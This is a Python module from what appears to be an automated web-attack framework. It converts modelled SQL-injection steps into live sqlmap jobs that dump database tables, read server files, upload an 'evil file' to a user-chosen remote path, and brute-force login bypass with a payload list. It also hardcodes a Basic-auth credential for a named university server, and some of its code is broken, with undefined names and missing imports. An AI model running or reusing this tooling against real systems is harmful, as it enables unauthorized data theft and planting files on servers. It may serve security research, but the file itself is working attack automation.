
#!/usr/local/bin/python3.5

"""
This module provides sql-injection extension
"""
import re
import json
import config
import requests
import linecache
import threading

from modules.logger import logger
from modules.wrapper import sqlmap
from modules.http import execute_request
from os.path import expanduser
from os.path import join
from os.path import isfile
from os import listdir

# --==[ SQL Injection ]==--
# 1: whenever I find a sqli somewhere, look for i -> webapp : tuple(of_the_same_sqli)
#    if found, data extraction is performed and thus inside the sqli array I'll have
#    and entry [a,idx] where idx is the line where the injection should be performed
# 2: if I don't perform a data extraction, a 0 should appear
# 3: sqli.lfi identifies a sql-injection for reading
# 4: sqli.evil_file identifies a sql-injection for writing
#


# Matrix form:
# [ ['a',[( tag_where_to_exploit, [ parameters_to_exploit ])]],
#         ['n',0]
#         ['e',0] ]
# Where  a: attack
#        n: normal request
#        e: exploit
"""
Understands sql-injection attacks on the message sequence chart.
msc_table: is the message sequence chart table
extended: is a JSON structure that extendes the msc_table for concretizing
            attacks
"""
def sqli(msc_table,extended):
    logger.debug("Starting extend_trace_sqli")
    sqli = []
    injection_point = ""
    for idx, message in enumerate(msc_table):
        logger.debug(message)
        tag = message[0]
        message = message[1]
        if message and len(message) == 3:
            # read message and check if it's a request and require an SQLi
            if (not message[0] == "webapplication") and "sqli" in message[len(message)-1] and not "tuple" in message[len(message)-1]:
                prova = "9"
                logger.debug("there is a sqli %s" % str(message))
                # now we should check what kind of sqli isa
                # is sqli is followed by evil_file, is a writing
                if( "sqli.evil_file" in message[len(message)-1] ):
                    entry = {"attack":2}
                    extended[tag] = entry
                    sqli.append(["w",0])
                # if is not a writing we check if sqli is followed by
                # anything that starts with a lower-case letter
                elif( re.search('sqli\.[a-z]',message[len(message)-1]) != None ):
                    logger.debug(message[len(message)-1])
                    par = re.search('([a-zA-Z]*)\.sqli',message[len(message)-1])

                    entry = {"attack":1,"params":{par.group(1)}}
                    extended[tag] = entry
                    sqli.append(["r",0])
                # otherwise is "standard" sqli
                else:
                    entry = {"attack":0}
                    extended[tag] = entry
                    sqli.append(["a",[]])
                injection_point = idx
            # we are exploiting a sqli, find the column that should be retrieved
            # .([a-z]*?).tuple
            elif "webapplication" in message[1] and "tuple" in message[len(message)-1] and "sqli" in message[len(message)-1]:
                #param_regexp = re.compile(r'(.*?).tuple\(')
                param_regexp = re.compile(r'\.?([a-zA-Z]*?)\.tuple')
                params = param_regexp.findall(message[len(message)-1])
                logger.debug("exploiting sqli here")
                logger.debug("Message: %s" % str(message))
                logger.debug("Params: %s" % str(params))
                logger.debug("Tag: %s" % str(tag))
                logger.debug("--------------------")
                # create a multiple array with params from different lines
                t = msc_table[injection_point][0]
                extended[t]["params"] = {tag:params}
                extended[tag] = {"attack": 6}
                sqli[injection_point][1].append((tag,params))
                sqli.append(["e",injection_point])
            else:
                if tag not in extended:
                    extended[tag] = {"attack":-1}
                    sqli.append(["n",0])
    logger.debug("%s" % str(sqli))
    return sqli


def sqlmap_parse_data_extracted(sqlmap_output):
    global data_to_extract
    # Let's parse the data extracted
    logger.debug(sqlmap_output)
    extracted_values = {}
    logger.debug(data_to_extract)
    for tblcol in data_to_extract:
        logger.debug(tblcol)
        tbl_list = tblcol.split(".")
        logger.debug(tbl_list[1])
        tmp_table = tbl_list[0]
        tmp_column = tbl_list[1]
        try:
            extracted_values[tmp_table]
        except KeyError:
            extracted_values[tmp_table] = {}
        try:
            extracted_values[tmp_table][tmp_column] = sqlmap_output["data"][2]["value"][tmp_column]["values"]
        except Exception:
            logger.critical("error in the sqlmap output")
            sqlmap.kill
            exit()
        logger.debug("Ending sqlmap extraction")
        sqlmap.kill()
    return extracted_values



def execute_sqlmap(sqlmap_details):
    global data_to_extract
    logger.debug(sqlmap_details)
    url = sqlmap_details["url"]
    method = sqlmap_details["method"]
    params = sqlmap_details["params"]

    logger.info("run sqlmapapi.py")
    is_sqlmap_up = sqlmap.run_api_server()
    if not is_sqlmap_up:
        logger.critical("sqlmap server not running")
        exit()
    task = sqlmap.new_task()

    # hardcoded configuration for the univr server
    # TODO: make it configurable from the command line
    sqlmap.set_option("authType","Basic",task)
    sqlmap.set_option("authCred","regis:password",task)
    #sqlmap.set_option("dropSetCookie","false",task)

    # set cookie if present and should be considered
    if config.keep_cookie and config.cookies != None:
        c = ""
        for k,v in config.cookies.items():
            c = c + k + "=" + v + ";"
        logger.debug("sqlmap with cookie")
        logger.debug(c)
        sqlmap.set_option("cookie",c,task)

    url_params = ""
    for k,v in params.items():
        url_params = url_params+k+"="+v+"&"
    url_params = url_params[:-1]
    if method == "GET":
        url = url+"?"+url_params
        sqlmap.set_option("url",url,task)
    elif method == "POST":
        sqlmap.set_option("url",url,task)
        sqlmap.set_option("data",url_params,task)

    try:
        data_to_extract = sqlmap_details["extract"]
        logger.debug(data_to_extract)
        sqlmap.set_option("dumpTable","true",task)
        # set data extraction only if we have data to extract
        col = ""
        tbl = ""
        for tblcol in data_to_extract:
            tbl_list = tblcol.split(".")
            logger.debug(tbl_list[0])
            # TODO: in here we're basically overwriting the table name
            # whenever we find a new one
            tbl = tbl_list[0]
            col = col + tbl_list[1]
        sqlmap.set_option("tbl",tbl,task)
        sqlmap.set_option("col",col,task)
    except KeyError:
        pass
    try:
        file_to_extract = sqlmap_details["read"]
        # TODO: ask if you want to change the file or continue ?
        sqlmap.set_option("rFile",file_to_extract,task)
    except KeyError:
        pass
    try:

        file_to_write = sqlmap_details["write"]
        if not isfile(file_to_write):
            debug.critical("Error: evil file not found")
            exit()
        logger.debug(dirname(realpath(__file__)))
        sqlmap.set_option("wFile",join(".",file_to_write),task)
        logger.debug("In which remote path you want to try to upload the file?")
        path = input()
        sqlmap.set_option("dFile",path,task)
    except KeyError:
        pass

    logger.info("sqlmap analysis started")
    sqlmap.start_scan(url,task)
    logger.debug(url)
    logger.debug(method)
    logger.debug(params)

    stopFlag = threading.Event()
    sqlmap_output = ""
    while not stopFlag.wait(5):
        r = sqlmap.get_status(task)
        if "terminated" in r:
            logger.debug(sqlmap.get_log(task))
            logger.info("sqlmap analysisnalysis terminated")
            sqlmap_output = sqlmap.get_data(task)
            stopFlag.set()
        else:
            logger.info("sqlmap analysis in progress ... ")
            logger.debug(sqlmap.get_log(task))

    return sqlmap_output


def execute_bypass(s,request,check):
    # now let's inject the params
    # TODO: fix, we assume we only have one param with ?
    params = request["params"]
    for park, parv in params.items():
        if parv == "?":
            with open("modules/sqli/bypasspayloads.txt") as f:
                for line in f.readlines():
                    params[park] = line.rstrip()
                    r = execute_request(s,request)
                    if check in r.text:
                        return True
    return False


"""
retrieve the list of files extracted by sqlmap which are stored in
~/.sqlmap/output/[domain]/files
"""
def get_list_extracted_files(attack_domain):
    logger.debug("domain: " + attack_domain)
    __sqlmap_files_path = expanduser(join("~",".sqlmap","output",attack_domain,"files"))

    try:
        files = [f for f in listdir(__sqlmap_files_path) if isfile(join(__sqlmap_files_path,f))]
    except FileNotFoundError:
        logger.critical("File not found! " + __sqlmap_files_path)
        logger.critical("Aborting execution")
        exit(0)
    for f in files:
        logger.info("content of file: " +join( __sqlmap_files_path, f))
        txt = open(join(__sqlmap_files_path,f))
        print(txt.read())
